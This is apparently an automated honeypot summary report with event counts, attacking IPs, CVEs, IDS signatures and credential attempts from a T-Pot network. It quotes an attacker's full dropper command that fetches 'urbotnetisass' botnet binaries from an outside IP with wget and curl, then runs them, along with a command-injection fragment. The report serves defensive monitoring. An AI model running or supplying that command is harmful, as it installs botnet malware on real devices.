Honeypot Attack Summary Report

**Report Generation Time:** 2025-09-30T06:01:35Z
**Timeframe of analysis:** 2025-09-30T05:20:01Z to 2025-09-30T06:00:01Z
**Files used to generate this report:**
- agg_log_20250930T052001Z.json
- agg_log_20250930T054001Z.json
- agg_log_20250930T060001Z.json

**Executive Summary**

This report summarizes 14,042 malicious events recorded by the T-Pot honeypot network. The majority of attacks were detected by the Dionaea, Suricata, and Honeytrap honeypots. A significant portion of the traffic targeted SMB (port 445), likely related to opportunistic worm-like activity. Attackers were observed attempting to download and execute malicious payloads, with a recurring campaign involving the 'urbotnetisass' malware. A variety of CVEs were targeted, indicating a broad scanning and exploitation effort.

**Detailed Analysis**

***Attacks by honeypot:***
* Dionaea: 5,376
* Suricata: 2,753
* Honeytrap: 2,320
* Cowrie: 1,910
* Ciscoasa: 1,445
* Mailoney: 57
* Adbhoney: 33
* Tanner: 29
* H0neytr4p: 26
* Honeyaml: 21
* Miniprint: 19
* ElasticPot: 19
* Sentrypeer: 17
* ConPot: 9
* Dicompot: 3
* Redishoneypot: 3
* ssh-rsa: 2

***Top attacking IPs:***
* 182.10.97.127: 3,150
* 176.102.32.230: 1,318
* 157.92.145.135: 1,252
* 61.246.5.41: 1,009
* 163.47.214.235: 936
* 185.156.73.166: 372
* 185.156.73.167: 366
* 92.63.197.55: 362
* 92.63.197.59: 338
* 150.95.27.115: 200

***Top targeted ports/protocols:***
* 445: 5,122
* TCP/445: 1,317
* 22: 348
* 3306: 215
* 23: 58
* 8333: 85
* TCP/22: 50
* 25: 57
* 80: 25
* 10250: 53

***Most common CVEs:***
* CVE-2002-0013
* CVE-2002-0012
* CVE-1999-0517
* CVE-2021-3449
* CVE-2019-11500
* CVE-2023-26801
* CVE-2009-2765
* CVE-2019-16920
* CVE-2023-31983
* CVE-2020-10987
* CVE-2023-47565
* CVE-2014-6271
* CVE-2015-2051
* CVE-2024-33112
* CVE-2022-37056
* CVE-2019-10891
* CVE-2001-0414

***Commands attempted by attackers:***
* `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; curl http://94.154.35.154/arm.urbotnetisass -O; chmod +x arm.urbotnetisass; ./arm.urbotnetisass android; busybox wget http://94.154.35.154/arm5.urbotnetisass; curl http://94.154.35.154/arm5.urbotnetisass -O; chmod +x arm5.urbotnetisass; ./arm5.urbotnetisass android; busybox wget http://94.154.35.154/arm6.urbotnetisass; curl http://94.154.35.154/arm6.urbotnetisass -O; chmod +x arm6.urbotnetisass; ./arm6.urbotnetisass android; busybox wget http://94.154.35.154/arm7.urbotnetisass; curl http://94.154.35.154/arm7.urbotnetisass -O; chmod +x arm7.urbotnetisass; ./arm7.urbotnetisass android; busybox wget http://94.154.35.154/x86_32.urbotnetisass; curl http://94.154.35.154/x86_32.urbotnetisass -O; chmod +x x86_32.urbotnetisass; ./x86_32.urbotnetisass android; busybox wget http://94.154.35.154/mips.urbotnetisass; curl http://94.154.35.154/mips.urbotnetisass -O; chmod +x mips.urbotnetisass; ./mips.urbotnetisass android; busybox wget http://94.154.35.154/mipsel.urbotnetisass; curl http://94.154.35.154/mipsel.urbotnetisass -O; chmod +x mipsel.urbotnetisass; ./mipsel.urbotnetisass android`
* `uname -s -v -n -r -m`
* `uname -a`
* `uname -s -m`

***Signatures triggered:***
* ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication: 1,312
* ET DROP Dshield Block Listed Source group 1: 462
* ET SCAN NMAP -sS window 1024: 195
* ET INFO Reserved Internal IP Traffic: 61
* ET SCAN Potential SSH Scan: 28
* ET CINS Active Threat Intelligence Poor Reputation IP group 46: 20
* ET CINS Active Threat Intelligence Poor Reputation IP group 41: 25
* ET CINS Active Threat Intelligence Poor Reputation IP group 43: 28
* ET DROP Spamhaus DROP Listed Traffic Inbound group 32: 22
* ET CINS Active Threat Intelligence Poor Reputation IP group 40: 20

***Users / login attempts:***
* dbo/: 199
* root/1234: 2
* rancher/rancher: 2
* rancher/rancher123: 2
* thayne/thayne: 2
* thayne/thayne1: 2
* thayne/thayne123: 2
* thayne/thayne1234: 2
* thayne/thayne12345: 2
* default/1: 3

***Files uploaded/downloaded:***
* arm.urbotnetisass: 6
* arm5.urbotnetisass: 6
* arm6.urbotnetisass: 6
* arm7.urbotnetisass: 6
* x86_32.urbotnetisass: 6
* mips.urbotnetisass: 6
* mipsel.urbotnetisass: 6
* fonts.gstatic.com: 3
* server.cgi?func=server02_main_submit&counter=6.7496022225883&TEST_BTN4=: 2
* rondo.qre.sh||busybox: 2

***HTTP User-Agents:***
No HTTP User-Agents were recorded in this period.

***SSH clients:***
No SSH clients were recorded in this period.

***SSH servers:***
No SSH servers were recorded in this period.

***Top attacker AS organizations:***
No attacker AS organizations were recorded in this period.

**Key Observations and Anomalies**

- A significant amount of traffic was directed at port 445 (SMB), with signatures for the DoublePulsar backdoor, suggesting ongoing automated exploitation attempts for vulnerabilities like EternalBlue.
- A recurring attack pattern involved attempts to download and execute a series of files with names like 'arm.urbotnetisass' from the IP address 94.154.35.154. This indicates a campaign targeting various CPU architectures.
- The variety of CVEs being scanned for suggests that many attackers are using broad-spectrum vulnerability scanners to find any possible entry point.
- The low success rate of login attempts, with most being default or simple credentials, highlights the importance of strong, unique passwords.
- The top attacking IPs are geographically diverse, indicating a widespread and distributed threat landscape.
